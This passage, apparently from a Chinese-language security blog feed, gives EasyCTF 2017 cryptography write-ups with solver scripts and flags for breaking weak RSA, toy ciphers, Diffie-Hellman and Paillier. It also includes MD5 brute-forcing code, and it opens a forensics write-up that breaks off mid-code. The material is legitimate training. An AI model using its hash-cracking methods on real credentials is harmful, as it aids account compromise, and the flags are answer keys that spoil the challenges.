</code></pre><h2 id="Let-Me-Be-Frank"><a href="#Let-Me-Be-Frank" class="headerlink" title="Let Me Be Frank"></a>Let Me Be Frank</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>I was talking to one of my friends but I couldn’t quite understand what he was saying. I think it might be important so here it is: <code>Nwh whdjwh qm uepen, T tjb fsmt tixgi jsrsh sigm gs mpzp xwqf iahxpv iw fslkt. pehgpxf{qtextz_glacz_elt_neinrw_qsg_bums_dcp}</code></p><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><p>维吉尼亚密码<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="external">解密</a></p><p><img src="http://i.imgur.com/Xqvx3DH.png" alt=""></p><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>Some more RSA! This time, there’s no P and Q… <a href="https://github.com/EasyCTF/easyctf-2017-problems/tree/master/rsa2" target="_blank" rel="external">this</a>.</p><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><p><a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="external">yafu</a>- Automated integer factorization</p><pre><code>yafu-x64.exe factor(266965481915457805187702917726550329693157)
...snip...
***factors found***
P21 = 458070420083487550883
P21 = 582804455845022449879
</code></pre><hr><pre><code>import libnum

n = 266965481915457805187702917726550329693157
p = 458070420083487550883
q = 582804455845022449879
e = 65537
c = 78670065603555615007383828728708393504251

phi = (p - 1) * (q - 1)
d = libnum.modular.invmod(e, phi)
print libnum.n2s(pow(c, d, n)) #flag{l0w_n_0eb6}
</code></pre><h2 id="Decode-Me"><a href="#Decode-Me" class="headerlink" title="Decode Me"></a>Decode Me</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>Someone I met today told me that they had a perfect encryption method. To prove that there is no such thing, I want you to decrypt this encrypted flag he gave me.</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><pre><code>import base64

with open(&apos;encrypted_flag.txt&apos;) as file:
    data = file.read()
    while True:
        if &apos;easyctf&apos; not in data:
            data = base64.b64decode(data)
        else:
            break
    print(data) # easyctf{what_1s_l0v3_bby_don7_hurt_m3}
</code></pre><h2 id="Hash-on-Hash"><a href="#Hash-on-Hash" class="headerlink" title="Hash on Hash"></a>Hash on Hash</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p>There’s a lot of hex strings here. Maybe they’re hiding a message? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hash-on-hash/hexstrings.txt" target="_blank" rel="external">hexstrings</a></p><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><pre><code>import hashlib

md5 = {}
string = &apos;&apos;

for x in xrange(0, 256):
    char = chr(x)
    md5_obj = hashlib.md5()
    md5_obj.update(char)
    md5_str = md5_obj.hexdigest()
    md5[md5_str] = char

with open(&apos;hexstrings.txt&apos;) as file:
    while True:
        line = file.readline().replace(&apos;\n&apos;, &apos;&apos;)
        if len(line) == 0:
            break
        string += md5[line]
print string # easyctf{1_h0p3_y0u_d1dn7_d0_7h47_by_h4nd}
</code></pre><h2 id="RSA-3"><a href="#RSA-3" class="headerlink" title="RSA 3"></a>RSA 3</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>We came across another <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/rsa3/rsa3" target="_blank" rel="external">message</a> that follows the same cryptographic schema as those other RSA messages. Take a look and see if you can crack it.</p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><pre><code>λ yafu-x64.exe factor(1172115235823606152023154654763747932660073385647694278339165126116107393252225152886841069176950866458540922555424233427042989493814327572078420 5110462278896087432260439082955593874915727686637956899)


fac: factoring 11721152358236061520231546547637479326600733856476942783391651261161073932522251528868410691769508664585409225554242334270429894938143275720784205110462278896087432260439082955593874915727686637956899
fac: using pretesting plan: normal
fac: no tune info: using qs/gnfs crossover of 95 digits
div: primes less than 10000
fmt: 1000000 iterations
Total factoring time = 0.3556 seconds


***factors found***

P100 = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780871
P100 = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780869

ans = 1
</code></pre><hr><pre><code>import libnum

n = 11721152358236061520231546547637479326600733856476942783391651261161073932522251528868410691769508664585409225554242334270429894938143275720784205110462278896087432260439082955593874915727686637956899
p = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780871
q = 3423616853305296708261404925903697485956036650315221001507285374258954087994492532947084586412780869
e = 65537
c = 2907995727224121244474109148869412603986746589983095760953378907471772983106265015352351411281256847387789301815094608746590512178894738862276459859204020010443067567963450732279228357933677075986407

phi = (p - 1) * (q - 1)
d = libnum.modular.invmod(e, phi)
print libnum.n2s(pow(c, d, n)) # easyctf{tw0_v3ry_merrry_tw1n_pr1m35!!_417c0d}
</code></pre><p>推荐文章：<a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="external">CTF中RSA的常见攻击方法</a></p><h2 id="Diffie-cult"><a href="#Diffie-cult" class="headerlink" title="Diffie-cult"></a>Diffie-cult</h2><h3 id="problem-8"><a href="#problem-8" class="headerlink" title="problem"></a>problem</h3><p>I just intercepted some odd <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/diffie-cult/messages.txt" target="_blank" rel="external">messages.txt</a>. It appears to be a Diffie-hellman protocol, but my math isn’t good enough to figure out what the final shared key is. Help! (The answer is a number. There is no <code>easyctf{}</code>)<br>Hint: Wikipedia explains Diffie-hellman pretty well.</p><h3 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h3><pre><code>g^a mod p = 421049228295820
g^b mod p = 105262307073955
p = 442101689710611
</code></pre><p>如果不知道Diffie-Hellman密钥交换算法可以先看：</p><p><a href="http://www.cnblogs.com/chenny7/p/6093207.html" target="_blank" rel="external">Diffie-Hellman密钥交换算法</a></p><p><a href="http://www.cnblogs.com/si812cn/archive/2009/11/26/1611272.html" target="_blank" rel="external">Diffie-Hellman密钥交换算法及其优化</a></p><p>题目的意思大概就是想让我们求出密钥K，Diffie-Hellman密钥交换算法的有效性依赖于计算离散对数的难度（<a href="https://www.zhihu.com/question/26030513" target="_blank" rel="external">知乎-离散对数为什么是难题？</a>），这里p较小且这题给的<code>g^a mod p</code>和<code>g^b mod p</code>以及<code>p</code>都比较巧（<code>g^a mod p</code>即使A发送给B的值，而<code>g^b mod p</code>是B发送给A的值），为什么比较巧呢，我们在<a href="http://www.factordb.com/" target="_blank" rel="external">素数库</a>找到他们的标准分解式。</p><pre><code>g^a mod p = 421049228295820 = 2^2 · 5 · 17 · 19^3 · 37 · 47^4 
g^b mod p = 105262307073955 = 5 · 17 · 19^3 · 37 · 47^4
p = 442101689710611 = 3 · 7 · 17 · 19^3 · 37 · 47^4
</code></pre><p>现在令<code>n = 17 · 19^3 · 37 · 47^4</code>，那么就有：</p><pre><code>g^a mod 21n = 20n
g^b mod 21n = 5n
</code></pre><p>我们把<code>g^a mod 21n = 20n</code>化简一下即：<code>g^a mod 21n = -n</code>，因为有<code>20n mod 21n = -n</code>，至于原理可以看一下密码学基础。</p><p>根据Diffie-Hellman密钥交换协议:</p><p><img src="http://i.imgur.com/KUnLwxR.png" alt=""></p><p>我们求的密钥K等于：<code>K = (（g ^ a）mod p)^b mod p</code></p><p>也就是:<code>K = (（g ^ a）mod 21n)^b mod 21n</code>，而前面已求过<code>g^a mod 21n = -n</code>，所以<code>K = (-n)^b mod 21n</code>，现在只有b的值不知道，不过我们可以以b自变量的值为变量研究因变量K的变化情况：</p><pre><code>n = 17 * (19 ** 3) * 37 * (47 ** 4)
p = 21 * n
for b in xrange(1,10):
    k = (-n) ** b % p
    print(&apos;k = (-n)^%d mod p = %d&apos; %(b, k))
</code></pre><hr><pre><code>K = (-n)^b mod 21n
k = (-n)^1 mod p = 421049228295820
k = (-n)^2 mod p = 42104922829582
k = (-n)^3 mod p = 357891844051447
k = (-n)^4 mod p = 168419691318328
k = (-n)^5 mod p = 105262307073955
k = (-n)^6 mod p = 231577075562701
k = (-n)^7 mod p = 421049228295820
k = (-n)^8 mod p = 42104922829582
k = (-n)^9 mod p = 357891844051447
</code></pre><p>可以看到当b = 7又开始循环，所以K的可能值有6个，最后提交验证K为<code>421049228295820</code>。</p><h2 id="Security-Through-Obscurity"><a href="#Security-Through-Obscurity" class="headerlink" title="Security Through Obscurity"></a>Security Through Obscurity</h2><h3 id="problem-9"><a href="#problem-9" class="headerlink" title="problem"></a>problem</h3><p>I’ve never seen such a cryptosystem before! It looks like a public key cryptosystem, though… Could you help me crack it?</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/security-through-obscurity/encrypt.sage" target="_blank" rel="external">encrypt.sage</a><br><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/security-through-obscurity/publickey_and_ciphertext.txt" target="_blank" rel="external">publickey and ciphertext.txt</a></p><h3 id="solution-9"><a href="#solution-9" class="headerlink" title="solution"></a>solution</h3><p><a href="http://www.sagemath.org/zh" target="_blank" rel="external">SageMath</a> 是一个基于GPL协议的开源数学软件。它使用Python作为通用接口，将现有的许多开源软件包整合在一起，构建一个统一的计算平台。<br>我们的目标：创建一个有活力的自由开源软件以替代Magma，Maple，Mathematica和Matlab。</p><p><a href="http://ai7.org/wp/html/682.html" target="_blank" rel="external">中文版的SageMath入门手册</a></p><p><a href="http://sagecell.sagemath.org/" target="_blank" rel="external">sage代码在线运行</a></p><p><a href="https://wenku.baidu.com/view/13c36ec09ec3d5bbfd0a74c8.html" target="_blank" rel="external">信息安全数学基础-有限域</a></p><p><a href="https://en.wikipedia.org/wiki/Nth_root_algorithm" target="_blank" rel="external">nth root algorithm</a></p><p>encrypt.sage：</p><pre><code>p = 196732205348849427366498732223276547339
primelist = [2,3,5,7,11,13,17,19,23,29,31,37,43,47,53,59]
secret = REDACTED

def calc_root(num, mod, n):
    f = GF(mod)
    temp = f(num)
    return temp.nth_root(n)

def gen_v_list(primelist, p, secret):
    a = []
    for prime in primelist:
        a.append(calc_root(prime, p, secret))
    return a

def decodeInt(i, primelist):
    pl = sorted(primelist)[::-1]
    out = &apos;&apos;
    for j in pl:
        if i%j == 0:
            out += &apos;1&apos;
        else:
            out += &apos;0&apos;
    return out

def bin2asc(b):
    return hex(int(b,2)).replace(&apos;0x&apos;,&apos;&apos;).decode(&apos;hex&apos;)


message = REDACTED
chunks = []
for i in range(0,len(message),2):
    chunks += [message[i:i+2]]

vlist = gen_v_list(primelist,p,secret)
print(vlist)
for chunk in chunks:
    binarized = bin(int(chunk.encode(&apos;hex&apos;),16)).replace(&apos;0b&apos;,&apos;&apos;).zfill(16)[::-1] #lsb first
    enc = 1
    for bit in range(len(binarized)):
        enc *= vlist[bit]**int(binarized[bit])
    enc = enc%p
    print(enc)
</code></pre><p>publickey and ciphertext.txt：</p><pre><code>p = 196732205348849427366498732223276547339
vlist = [186290890175539004453897585557650819247, 75402298316736094226532182518108134406, 125495142022496378270547998225256386407, 97774267687164931514953833940936099082, 101991197227908059637463567354647370660, 153833851791059142883915934225837717549, 57404874013093467650483424580890463792, 21385179362692238453302681296928238570, 73119997627509808412069264512026243174, 187307466063352771786747395191866088255, 99696708971915885525739992181010504930, 35400960589917132410614021764179554582, 165004028169785856134522269878963539096, 23921651712221317415895203722083962980, 101282552285744196401422074083408273639, 36527324251768098978171373433957274016]
ciphertext = [10804437392992369932709952388461430442, 176193785024128365464527424154073333243, 149270645998191619421663334736314262928, 84083279828403258970202482839973583723, 105542809657403162156368566034837560781, 170535468317794277192003839288646533914, 1709561989051017137832962458645802494, 30208132812353075834728747743616689590, 179552149608863037880916374596103803214, 146319871444551859531557724256502213689, 94266034977624098660397183255753485858, 59624105602644297614582310044425417646, 150207980679551836987813576795479579005, 47189940152625174480564945084004798024, 60923399917552243674613186036841652885, 56060552313063913798237738953734149992, 153365453785043472981157196787373992079, 97439800863356756323659264743487719966, 105572255903480949865247928773026019148, 47189940152625174480564945084004798024, 32547907449246015626932936731350157592, 97471053149217334376536988401195572824, 156999991149661497460742185971412527182, 97705058765750947378422286408948780428, 56123764944636237849915747435965967337, 180380146745295930385428990214293723238, 178014626944341285289827069179285260436, 99504741454750536629756505680249931430]
</code></pre><p>大致看一下程序，理一下代码逻辑，message就是我们要求的明文，然后被分成每2个字符为一组添加到chunks列表：</p><pre><code>message = REDACTED
chunks = []
for i in range(0,len(message),2):
    chunks += [message[i:i+2]]
</code></pre><p>vlist已经给了，所以不用再去求<code>secret</code>，接下来就是每2个字符简单的二值化处理再倒序，之后就是16次循环加密处理。</p><pre><code>vlist = gen_v_list(primelist,p,secret)
print(vlist)
for chunk in chunks:
    binarized = bin(int(chunk.encode(&apos;hex&apos;),16)).replace(&apos;0b&apos;,&apos;&apos;).zfill(16)[::-1] #lsb first
    enc = 1
    for bit in range(len(binarized)):
        enc *= vlist[bit]**int(binarized[bit])
    enc = enc%p
    print(enc)
</code></pre><p>加密结果已经给了，一共28组，所以能推出明文长度为56，我们知道ASCII字符的范围0-255，再从上面的加密代码分析可知，chunk最多就只有<code>256*256=65536</code>种组合，再做16次循环加密处理，也就是说最多1048576（<code>256*256*16</code>）次就能把一组明文穷举出来，计算机对1048576这个次数简直毫无压力，所以上代码：</p><pre><code>p = 196732205348849427366498732223276547339
vlist = [186290890175539004453897585557650819247, 75402298316736094226532182518108134406, 125495142022496378270547998225256386407, 97774267687164931514953833940936099082, 101991197227908059637463567354647370660, 153833851791059142883915934225837717549, 57404874013093467650483424580890463792, 21385179362692238453302681296928238570, 73119997627509808412069264512026243174, 187307466063352771786747395191866088255, 99696708971915885525739992181010504930, 35400960589917132410614021764179554582, 165004028169785856134522269878963539096, 23921651712221317415895203722083962980, 101282552285744196401422074083408273639, 36527324251768098978171373433957274016]
ciphertext = [10804437392992369932709952388461430442, 176193785024128365464527424154073333243, 149270645998191619421663334736314262928, 84083279828403258970202482839973583723, 105542809657403162156368566034837560781, 170535468317794277192003839288646533914, 1709561989051017137832962458645802494, 30208132812353075834728747743616689590, 179552149608863037880916374596103803214, 146319871444551859531557724256502213689, 94266034977624098660397183255753485858, 59624105602644297614582310044425417646, 150207980679551836987813576795479579005, 47189940152625174480564945084004798024, 60923399917552243674613186036841652885, 56060552313063913798237738953734149992, 153365453785043472981157196787373992079, 97439800863356756323659264743487719966, 105572255903480949865247928773026019148, 47189940152625174480564945084004798024, 32547907449246015626932936731350157592, 97471053149217334376536988401195572824, 156999991149661497460742185971412527182, 97705058765750947378422286408948780428, 56123764944636237849915747435965967337, 180380146745295930385428990214293723238, 178014626944341285289827069179285260436, 99504741454750536629756505680249931430]
plaintext = &apos;&apos;

for i in ciphertext:
    find = False
    for j in xrange(256):
        if find:
            break
        for k in xrange(256):
            chunk = chr(j) + chr(k)
            binarized = bin(int(chunk.encode(&apos;hex&apos;),16)).replace(&apos;0b&apos;,&apos;&apos;).zfill(16)[::-1]
            enc = 1
            for bit in range(len(binarized)):
                enc *= vlist[bit]**int(binarized[bit])
            enc = enc%p
            if enc == i:
                find = True
                plaintext += chunk
                break
print(plaintext) 
</code></pre><hr><pre><code>flag{i_actu4lly_d0nt_know_th3_name_of_th15_crypt0sy5tem} 
used time:18.040904s
</code></pre><h2 id="Lost-Seed"><a href="#Lost-Seed" class="headerlink" title="Lost Seed"></a>Lost Seed</h2><h3 id="problem-10"><a href="#problem-10" class="headerlink" title="problem"></a>problem</h3><p>Every time I encrypt a flag with this <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/lost-seeds/encrypt" target="_blank" rel="external">program</a>, it gives me something <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/lost-seeds/flag.out" target="_blank" rel="external">different</a>.</p><h3 id="solution-10"><a href="#solution-10" class="headerlink" title="solution"></a>solution</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v3; // bl@2
  int result; // eax@4
  __int64 v5; // rcx@4
  char v6; // [sp+Bh] [bp-85h]@2
  int v7; // [sp+Ch] [bp-84h]@1
  int v8; // [sp+10h] [bp-80h]@1
  int v9; // [sp+14h] [bp-7Ch]@2
  FILE *stream; // [sp+18h] [bp-78h]@1
  char ptr[88]; // [sp+20h] [bp-70h]@1
  __int64 v12; // [sp+78h] [bp-18h]@1

  v12 = *MK_FP(__FS__, 40LL);
  stream = fopen(&quot;flag.in&quot;, &quot;r&quot;);
  fread(ptr, 1uLL, 0x50uLL, stream);
  fclose(stream);
  stream = fopen(&quot;flag.out&quot;, &quot;wb&quot;);
  seed = realrand(&quot;flag.out&quot;, &quot;wb&quot;);
  v7 = 0;
  v8 = strlen(ptr);
  while ( v7 &lt; v8 )
  {
    v3 = ptr[v7];
    v9 = pseudorand();
    v6 = v3 ^ v9;
    fwrite(&amp;v6, 1uLL, 1uLL, stream);
    ++v7;
  }
  fclose(stream);
  result = 0;
  v5 = *MK_FP(__FS__, 40LL) ^ v12;
  return result;
}
</code></pre><h2 id="Listen-Closely"><a href="#Listen-Closely" class="headerlink" title="Listen Closely"></a>Listen Closely</h2><h3 id="problem-11"><a href="#problem-11" class="headerlink" title="problem"></a>problem</h3><p>We intercepted a secret message, but we can’t tell what it’s saying. Maybe you can help? <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/listen-closely/listenclosely.wav" target="_blank" rel="external">super secret message</a><br>hint: 1, 16, 8000. After you use those, the problem is strictly crypto.</p><h3 id="solution-11"><a href="#solution-11" class="headerlink" title="solution"></a>solution</h3><p><a href="https://writeups.easyctf.com/" target="_blank" rel="external">writeup</a></p><h2 id="Genius"><a href="#Genius" class="headerlink" title="Genius"></a>Genius</h2><h3 id="problem-12"><a href="#problem-12" class="headerlink" title="problem"></a>problem</h3><p>Your boss told you that <a href="http://genius.web.easyctf.com/" target="_blank" rel="external">this</a> team has come up with the cryptographic hash of the future, but something about their operation just seems a little fishy.</p><h3 id="solution-12"><a href="#solution-12" class="headerlink" title="solution"></a>solution</h3><pre><code>8a7fca9234d2f19c8abfcd812971a26c8c510dcaefd5061b191ad41d8b57d0ce631f5074f94b32730d0c025f1d7aacd7
be1ab1632e4285edc3733b142935c60b90383bad42309f7f6850d2b4250a713d0b2d7a97350465a02554d29d92bfefaf
d64ddd0de1b187cd670783f5e28d681dd401ed3009d05ce4ef600d364a2c953e4cc801b880dddef59829a5ad08bd8a63
73d559bc117f816333174e918d0587de5cca214701dbe9f7f42da7bccf074b811292b9d4dc398866ef95869b22b3941e
78635bc95eaa7662a2ddf3e3d45cf1084f4233d6c396e8a0e6fbf597d07b88178d03f3f7757bdbdaaed60729d08bb180
b42dad5453b2128a32f6612b13ea5d9fef843bee79633652a6d6ae08e964609f00e883ab809346226dff6887080fb68b
</code></pre><p>给了6组哈希值，每组96个字符，还提示到了MD5，于是丢<a href="https://crackstation.net/" target="_blank" rel="external">crackstation</a>跑一下：</p><p><img src="http://chuantu.biz/t5/53/1490633101x2890174314.png" alt=""></p><p>简单验证一下：</p><pre><code>md5(like) = be1ab1632e4285edc3733b142935c60b
md5(ly_s) = d64ddd0de1b187cd670783f5e28d681d
md5(ng_2) = 73d559bc117f816333174e918d0587de
md5(have) = b42dad5453b2128a32f6612b13ea5d9f
</code></pre><p>推测每组就是三个MD5组合的，于是将所有的MD5换行拆分再进行一次查找：</p><p><img src="http://chuantu.biz/t5/53/1490633885x2890174314.png" alt=""></p><p>还有7个没有破解，从上面的都是4位简单的消息，于是把未找出的7个扔<a href="https://md5db.net/" target="_blank" rel="external">MD5库</a>：</p><p><img src="http://chuantu.biz/t5/53/1490634718x2890174314.png" alt=""></p><p>按顺序组合一下：<code>OMG_it_took_like_LITerally_s0oO00_long_2_MAK3_md5_werrk_you_have_no_id34</code><br>提交给了flag：<code>easyctf{OUR_3nCRYpti0n_is_N0T_br0k3n_Ur_brok3n_6c5a390d}</code></p><p>py优雅解决方式：</p><pre><code>import hashlib

hashs = &apos;8a7fca9234d2f19c8abfcd812971a26c8c510dcaefd5061b191ad41d8b57d0ce631f5074f94b32730d0c025f1d7aacd7be1ab1632e4285edc3733b142935c60b90383bad42309f7f6850d2b4250a713d0b2d7a97350465a02554d29d92bfefafd64ddd0de1b187cd670783f5e28d681dd401ed3009d05ce4ef600d364a2c953e4cc801b880dddef59829a5ad08bd8a6373d559bc117f816333174e918d0587de5cca214701dbe9f7f42da7bccf074b811292b9d4dc398866ef95869b22b3941e78635bc95eaa7662a2ddf3e3d45cf1084f4233d6c396e8a0e6fbf597d07b88178d03f3f7757bdbdaaed60729d08bb180b42dad5453b2128a32f6612b13ea5d9fef843bee79633652a6d6ae08e964609f00e883ab809346226dff6887080fb68b&apos;

def get_md5_list(hashs):
    md5_list = []
    for x in xrange(0, len(hashs), 32):
        md5_list.append(hashs[x:x+32])
    return md5_list

def gen_char_list():
    char_list = []
    for x in xrange(48, 58): # 0 ~ 9
        char_list.append(chr(x))
    for x in xrange(65, 91): # A ~ Z
        char_list.append(chr(x))
    for x in xrange(97, 123): # a ~ z
        char_list.append(chr(x))
    char_list.append(&apos;_&apos;) # _
    return char_list

def brute_force_md5(char_list, md5_list):
    plain_dict = {}
    for c1 in char_list:
        for c2 in char_list:
            for c3 in char_list:
                for c4 in char_list:
                    chars = c1 + c2 + c3 + c4
                    md5_obj = hashlib.md5()
                    md5_obj.update(chars)
                    md5_str = md5_obj.hexdigest()
                    if md5_str in md5_list:
                        plain_dict[md5_str] = chars
    return plain_dict

def get_plain(md5_list, plain_dict):
    plain = &apos;&apos;
    for md5 in md5_list:
        plain += plain_dict[md5]
    return plain

def main():
    md5_list = get_md5_list(hashs)
    char_list = gen_char_list()
    plain_dict = brute_force_md5(char_list, md5_list)
    plain = get_plain(md5_list, plain_dict)
    print(plain)

if __name__ == &apos;__main__&apos;:
    main()
</code></pre><h2 id="RSA-4"><a href="#RSA-4" class="headerlink" title="RSA 4"></a>RSA 4</h2><h3 id="problem-13"><a href="#problem-13" class="headerlink" title="problem"></a>problem</h3><p>After doing so much RSA, I finally messed up…. pls help. I encrypted my secret <a href="https://writeups.easyctf.com/files/rsa4.txt" target="_blank" rel="external">message</a> but the decryption isn’t working!!</p><h3 id="solution-13"><a href="#solution-13" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/ValarDragon/CTF-Writeups/tree/master/2017/EasyCTF/RSA%204" target="_blank" rel="external">writeup</a></p><h2 id="Premium-RSA"><a href="#Premium-RSA" class="headerlink" title="Premium RSA"></a>Premium RSA</h2><h3 id="problem-14"><a href="#problem-14" class="headerlink" title="problem"></a>problem</h3><p>My RSA is the greatest. It’s so strong, in fact, that I’ll even give you d! <a href="https://www.easyctf.com/static/d99abfa412f17c8d3229daabd0d6dda800d4f303_ciphertext.txt" target="_blank" rel="external">file</a></p><p>hint: You thought it’d be that simple?</p><h3 id="solution-14"><a href="#solution-14" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/ValarDragon/CTF-Writeups/tree/master/2017/EasyCTF/Premium%20RSA" target="_blank" rel="external">writeup</a></p><h2 id="Paillier-Service"><a href="#Paillier-Service" class="headerlink" title="Paillier Service"></a>Paillier Service</h2><h3 id="problem-15"><a href="#problem-15" class="headerlink" title="problem"></a>problem</h3><p>My friend made some sort of encryption service using the Paillier cryptosystem. Can you get him to encrypt the string easyctf{3ncrypt_m3!} for me? Your flag will be a base 10 integer.</p><p>Access his encryption service at <code>paillier.tcp.easyctf.com 8570</code></p><h3 id="solution-15"><a href="#solution-15" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/ValarDragon/CTF-Writeups/tree/master/2017/EasyCTF/Paillier%20Service" target="_blank" rel="external">writeup</a></p><pre><code># Paillier.py
import binascii

#Gathered from connecting manually
# m = 1, r = 1
g = 76148136246979412868353192826161253341403849263254887278017187958514513340458179944731332795505616407225022188597713956679924138156737337560391522285190471306102238935856085554943425316921717217530405444795878376547349107664015741971592178799088766898531556269231518219697725522509132047243753064371633643298

# m = 2, r = 1
g2 = 152296272493958825736706385652322506682807698526509774556034375917029026680916359889462665591011232814450044377195427913359848276313474675120783044570380942612204477871712171109886850633843434435060810889591756753094698215328031483943184357598177533797063112538463036439395451045018264094487506128743267286595

expectedG2 = g*g

#Using Factordb, we find that expectedG2-g2 is a perfect square of a prime, which is below
#http://factordb.com/index.php?id=1100000000882961502
n = 76148136246979412868353192826161253341403849263254887278017187958514513340458179944731332795505616407225022188597713956679924138156737337560391522285190471306102238935856085554943425316921717217530405444795878376547349107664015741971592178799088766898531556269231518219697725522509132047243753064371633643297
n2 = n*n
m2r2 = 642704871773304452155778596282877892451871980828477596157415930594972102473171707034871466334408214634990379265334519095544245651795310239071984348465353456082430791507322024283077057140015173791209040404351064470318177893091562745760770981747716308255111472933684059218100124906239297276402113587510274467857526915676715307055889593001002210535184406398178516901311847346979934161946287183599368736554797730366291587740218078384204696550286009123986874335424671114430592617561047352470044247529967986001239137580719442869043114141323570567593427242451750466586033713111304296116982128148631354597378733690535403149
#check for no errors
assert (pow(g,2,n2)*pow(2,n,n2))%n2 == m2r2
assert (pow(g,2,n2))%n2 == g2

# get int of string easyctf{3ncrypt_m3!}
goal = b&apos;easyctf{3ncrypt_m3!}&apos;
hexGoal = str(binascii.hexlify(goal),&apos;utf-8&apos;)
goal = int(hexGoal,16)
#print(goal)
#goal is divisible by 5, so use that for Homomorphic property
m5r1 = pow(g,5,n2)
goalDiv5 = goal // 5
# Now use the Homomorphic property :)
flagInt = pow(m5r1,goalDiv5,n2)
print(flagInt)
</code></pre>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cryptography </tag>
            
            <tag> ctf writeup </tag>
            
            <tag> easyctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[EasyCTF 2017 Forensics Write Up]]></title>
      <url>/2017/04/09/EasyCTF-2017-Forensics-Write-Up/</url>
      <content type="html"><![CDATA[<p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org/" target="_blank" rel="external">HackFun</a></p><h1 id="0x02-Forensics"><a href="#0x02-Forensics" class="headerlink" title="0x02 Forensics"></a>0x02 Forensics</h1><h2 id="Mane-Event"><a href="#Mane-Event" class="headerlink" title="Mane Event"></a>Mane Event</h2><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><p>My friend just got back from the plains and he took this picture with his new camera. He also told me there’s a flag hidden in it - can you check it out for me?</p><a id="more"></a><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p><img src="http://i.imgur.com/my9zu14.png" alt=""></p><h2 id="20xx"><a href="#20xx" class="headerlink" title="20xx"></a>20xx</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>My friend sent me this <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/20xx/_20xx.dtm" target="_blank" rel="external">file</a> and told me to git gud.</p><h3 id="polutin"><a href="#polutin" class="headerlink" title="polutin"></a>polutin</h3><p><a href="https://writeups.easyctf.com/forensics/20xx-50-points.html" target="_blank" rel="external">20xx writeup</a></p><h2 id="scisnerof"><a href="#scisnerof" class="headerlink" title="scisnerof"></a>scisnerof</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>I found weird file! <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/scisnerof/elif" target="_blank" rel="external">elif</a></p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i.imgur.com/02p1vZ6.png" alt=""></p><p>png文件内容被倒序处理了，写一个脚本恢复：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">"elif"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> file:</div><div class="line">    <span class="keyword">with</span> open(<span class="string">"new.png"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> png:</div><div class="line">        data = []</div><div class="line">        byte = file.read(<span class="number">1</span>)</div><div class="line">        <span class="keyword">while</span> byte != <span class="string">""</span>:</div><div class="line">            data.append(byte)</div><div class="line">            byte = file.read(<span class="number">1</span>)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(data):</div><div class="line">            png.write(i)</div></pre></td></tr></table></figure><p></p><p><img src="http://i.imgur.com/0Veqs2V.png" alt=""></p><p>flag:<code>easyctf{r3v3r5ed_4ensics}</code></p><h2 id="Petty-Difference"><a href="#Petty-Difference" class="headerlink" title="Petty Difference"></a>Petty Difference</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>I found two files in a secret room. They look like jumbled letters with no patterns. I mean look at it! <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/petty-difference/file1.txt" target="_blank" rel="external">file1</a> is identical to <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/petty-difference/file2.txt" target="_blank" rel="external">file2</a>, right?</p><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div 